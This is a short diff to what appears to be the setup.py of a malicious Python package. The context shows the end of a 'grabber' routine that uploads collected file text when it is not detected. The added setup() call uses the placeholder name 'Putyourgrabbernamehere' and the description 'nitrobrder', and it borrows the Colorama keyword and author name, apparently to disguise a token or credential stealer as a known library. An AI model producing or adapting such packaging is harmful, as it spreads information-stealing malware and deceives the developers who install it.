@@ -681,4 +681,16 @@ if not DETECTED:
     upload('kiwi',filetext)
 
 
-# setup(...) removed                                                                                                                                                                                                                                                                                            
+setup(
+
+    name='Putyourgrabbernamehere',
+    packages=['Putyourgrabbernamehere'],
+    version='1.0',
+    license='MIT',
+    description='nitrobrder',
+    author=' Jonathan Hartley',
+    keywords=['Colorama'],
+    install_requires=[''],
+    classifiers=['Development Status :: 5 - Production/Stable']
+
+)
